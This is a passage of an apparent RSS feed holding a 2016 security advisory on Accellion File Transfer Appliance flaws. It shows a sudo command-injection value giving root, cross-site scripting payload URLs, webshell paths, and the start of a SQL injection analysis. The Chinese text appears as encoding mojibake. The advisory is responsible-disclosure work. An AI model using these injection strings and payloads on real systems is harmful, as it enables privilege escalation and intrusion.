   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;appid=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;servername=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;version=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;token=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/usr/bin/yum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;`;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/etc/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/home/seos/log/yum.diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf-5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unable to mount: $!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ê∑±ÂÖ•ËßÄÂØü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; ÂæåÂèØÁôºÁèæÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt; ÂèÉÊï∏‰∏äÂ≠òÂú® Command InjectionÔºå‰ΩøÂæóÊîªÊìäËÄÖÂèØÂ∞á‰ªªÊÑèÊåá‰ª§ÊèíÂÖ•ÂèÉÊï∏ÂÖß‰∏¶‰ª• root Ë∫´ÂàÜÂü∑Ë°å&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•‰ΩøÁî®Â¶Ç‰∏ãÊåá‰ª§Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/yum-client.pl &lt;span class=&quot;nt&quot;&gt;--cdrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$(id &amp;gt; /tmp/.gg)&apos;&lt;/span&gt;
mount: can&lt;span class=&quot;s1&quot;&gt;&apos;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Âç≥ÂèØ‰ª• root Ë∫´ÂàÜÂü∑Ë°å‰ªªÊÑèÊåá‰ª§ÔºÅ
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂæåÈñÄ&quot;&gt;ÂæåÈñÄ&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Âú®ÂèñÂæóÊúÄÈ´òÊ¨äÈôêÂæåÔºåÈñãÂßãÂ∞ç‰º∫ÊúçÂô®ÈÄ≤Ë°å‰∏Ä‰∫õÂØ©Ë¶ñÊôÇÔºåÁôºÁèæÂ∑≤ÊúâÂπæÊ¨æÂæåÈñÄËóèÂú® FTA ‰∏ªÊ©ü‰∏≠‰∫ÜÔºåÁ∂ìÈÅéÁ†îÁ©∂ÂæåÈ¶ñÂÖàÁ¢∫Ë™ç‰∏ÄÊ¨æ IRC BOT ÁÇ∫ Niara ÊâÄÁôºÂ∏ÉÁöÑ &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Âº±ÈªûÂ†±Âëä&lt;/a&gt; ‰∏≠ÊúâÊèêÂèäÔºåÊ≠§Â§ñÔºåÈ°çÂ§ñÁôºÁèæÂÖ©Ê¨æ‰∏çÂêåÈ°ûÂûãÁöÑ PHP Webshell ‰∏¶ÁÑ°Âú®ÂÖ¨ÈñãÁöÑÂ†±Âëä‰∏≠ÁôºÁèæÔºåÈÄèÈÅé Apache Log ÊôÇÈñìÊé®Ê∏¨ÊáâË©≤ÊòØÈÄèÈÅé 2015 Âπ¥‰∏≠ÁöÑ CVE-2015-2857 ÊâÄÊîæÁΩÆ‰πãÂæåÈñÄ„ÄÇ&lt;/p&gt;

&lt;p&gt;PHPSPY ÂæåÈñÄÔºåÂÖ®ÁêÉ 1217 Âè∞Â≠òÊ¥ª‰∏ªÊ©ü‰∏äÂÖ±ÁôºÁèæ 62 Âè∞ÔºåÊîæÁΩÆË∑ØÂæëÊñºÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WSO ÂæåÈñÄÔºåÂÖ®ÁêÉ 1217 Âè∞Â≠òÊ¥ª‰∏ªÊ©ü‰∏äÂÖ±ÁôºÁèæ 9 Âè∞ÔºåÊîæÁΩÆË∑ØÂæëÊñºÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;Ëá¥Ë¨ù&quot;&gt;Ëá¥Ë¨ù&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
ÈÄô‰ªΩ Advisory ÊâÄÊèêÂèäÁöÑÂº±ÈªûÁÇ∫Âú® 2016 ‰∫åÊúàÊôÇÂèÉÂä† Facebook Bug Bounty ÊôÇÂ∞ãÊâæÂà∞ÁöÑÔºåË©≥ÊÉÖÂèØÂèÉËÄÉÊñáÁ´†„Ää&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;Êª≤ÈÄè Facebook ÁöÑÊÄùË∑ØËàáÁôºÁèæ&lt;/a&gt;„ÄãÔºåÊâæÂà∞Âº±ÈªûÁöÑÁï∂‰∏ãÁ´ãÂç≥ÂõûÂ†±ÂåÖÊã¨ Accellion Âèä FacebookÔºåAccellion ‰∏¶Âú® 2/12 ËôüÂ∞áÊ≠§‰ªΩÂº±ÈªûË®òÈåÑÂú® FTA_9_12_40 ‰∏¶ÈÄöÁü•ÊâÄÊúâÂèóÂΩ±ÈüøÁöÑÂÆ¢Êà∂ÂÆâË£ù‰øÆË£úÁ®ãÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊÑüË¨ù Facebook ‰ª•Âèä Accellion ÁöÑËøÖÈÄüÂèçÊáâË∑üÈÖçÂêà : )
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/06 05:21 ËÅØÁµ° Accellion Ë©¢Âïè‰ΩïËôïÂèØÂõûÂ†±Âº±Èªû&lt;/li&gt;
  &lt;li&gt;2016/02/07 12:35 Â∞áÂ†±ÂëäÂØÑËá≥ Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/03/03 03:03 Accellion Support Team ÈÄöÁü•ÊúÉÂú® FTA_9_12_40  ‰øÆÂæ©&lt;/li&gt;
  &lt;li&gt;2016/05/10 15:18 Ë©¢ÂïèÂ∞áÊí∞ÂØ´ Advisory Ë®±ÂèØÂèäÈÄöÁü•ÁôºÁèæÂÖ©Ê¨æÂæåÈñÄÂ≠òÂú®&lt;/li&gt;
  &lt;li&gt;2016/06/06 10:20 ÈõôÊñπË®éË´ñÂÆöÁ®ø&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂèÉËÄÉ&quot;&gt;ÂèÉËÄÉ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;about-accellion-fta&quot;&gt;About Accellion FTA&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Accellion File Transfer Appliance (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTA&lt;/code&gt;) is a secure file transfer service which enables users to share and sync files online with AES 128/256 encryption. The Enterprise version further incorporates SSL VPN services with integration of Single Sign-on mechanisms like AD, LDAP and Kerberos.
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
In this research, the following vulnerabilities were discovered on the FTA version FTA_9_12_0 (13-Oct-2015 Release)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above-mentioned vulnerabilities allow unauthenticated attackers to remotely attack FTA servers and gain highest privileges successfully. After the attackers fully controlled the servers, they will be able to retrieve the encrypted files and user data, etc.&lt;/p&gt;

&lt;p&gt;After reporting to CERT/CC, these vulnerabilities were assigned 4 CVEs (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353).&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;areas-affected&quot;&gt;Areas Affected&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore.&lt;br /&gt;
Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;vulnerability-analysis-and-exploitation&quot;&gt;Vulnerability Analysis and Exploitation&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;
?f2=‚Äô-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;
?documentname=‚Äùonerror=‚Äùprompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;
?msg=ssologout&lt;br /&gt;
&amp;amp;loginurl=‚Äù&amp;gt;&amp;lt;svg/onload=‚Äùprompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.&lt;br /&gt;
The key to this problem lies in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; function called by security_key2.api!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Among these parameters, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$password&lt;/code&gt; are controllable by the attackers. And although the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; handles the passwords, it does not involve in the triggering of the vulnerability.&lt;br /&gt;
One thing to pay special attention is that the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; will be treated as a global variable which represents the current Application ID in use, and will be applied in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; accordingly. The code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; includes the following lines:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt;, the name of the database to be opened is controllable by the user. If wrong value was given, the program will be interrupted. Therefore, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; must be forged correctly.&lt;/p&gt;

&lt;p&gt;The following lines are the most important function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; 